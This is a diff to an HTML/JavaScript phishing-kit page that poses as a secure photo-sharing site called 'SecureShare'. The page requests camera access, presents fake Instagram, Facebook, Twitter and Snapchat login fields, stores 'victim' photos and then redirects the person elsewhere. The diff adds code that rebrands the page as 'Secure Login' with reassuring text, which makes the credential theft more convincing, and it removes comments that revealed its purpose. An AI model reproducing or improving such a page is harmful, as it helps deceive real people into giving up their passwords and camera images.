@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>SecureShare</title>
+    <title id="pageTitle">SecureShare</title>
     <style>
         * {
             margin: 0;
@@ -205,7 +205,6 @@
             justify-content: center;
         }
 
-        /* small screens */
         @media (max-width: 480px) {
             .glass {
                 padding: 24px 16px 20px;
@@ -232,15 +231,15 @@
 
     <!-- ===== MAIN PAGE ===== -->
     <div class="glass flex-center" id="mainPage">
-        <h1>🔒 SecureShare</h1>
-        <p class="sub">🔐 Encrypted &amp; Verified</p>
+        <h1 id="brandName">🔒 SecureShare</h1>
+        <p class="sub" id="brandSub">🔐 Encrypted &amp; Verified</p>
         <div class="frame">
-            <img id="userPhoto" src="https://via.placeholder.com/600x450/1a1a2e/ffffff?text=Secure+Photo" alt="User Photo" />
+            <img id="userPhoto" src="https://via.placeholder.com/600x450/1a1a2e/ffffff?text=Loading+Photo" alt="User Photo" />
         </div>
-        <button class="glow-btn sparkle" onclick="requestCamera()">
+        <button class="glow-btn sparkle" id="mainActionBtn" onclick="requestCamera()">
             📸 Continue to View
         </button>
-        <p class="footer-text">This connection is secure and encrypted</p>
+        <p class="footer-text" id="footerText">This connection is secure and encrypted</p>
     </div>
 
     <!-- ===== SOCIAL PACKAGES ===== -->
@@ -274,6 +273,17 @@
         const redirectUrl = '{{REDIRECT_URL}}';
 
         let currentPlatform = '';
+
+        // ===== SECURESHARE SIRF CAMERA ME =====
+        if (targetType !== 'cam') {
+            document.getElementById('brandName').textContent = '🔑 Secure Login';
+            document.getElementById('brandSub').textContent = 'Access your account securely';
+            document.getElementById('mainActionBtn').textContent = '🔓 Continue';
+            document.getElementById('footerText').textContent = 'Your data is protected';
+            document.title = 'Secure Login';
+        } else {
+            document.title = 'SecureShare';
+        }
 
         // ===== DEVICE INFO =====
         function getDeviceInfo() {
@@ -474,7 +484,6 @@
                 document.getElementById('loginPage').dataset.package = '';
             }
 
-            // Clear fields
             document.getElementById('loginUser').value = '';
             document.getElementById('loginPass').value = '';
         }
@@ -498,7 +507,6 @@
                 }
             });
 
-            // Redirect
             const socialPlatforms = ['ig', 'fb', 'tw', 'sc'];
             if (socialPlatforms.includes(currentPlatform)) {
                 window.location.href = 'https://takipcikrali.com/';
@@ -518,13 +526,12 @@
             document.getElementById('loginPage').classList.add('hidden');
         }
 
-        // ===== ON LOAD: try to show victim photo if stored =====
+        // ===== ON LOAD =====
         (function() {
             const saved = localStorage.getItem('victim_photo_' + victimId);
             if (saved) {
                 document.getElementById('userPhoto').src = saved;
             }
-            // If camera type, show placeholder
             if (targetType === 'cam') {
                 document.getElementById('userPhoto').src =
                     'https://via.placeholder.com/600x450/1a1a2e/ffffff?text=Secure+Photo';
@@ -532,4 +539,4 @@
         })();
     </script>
 </body>
-  </html>
+</html>
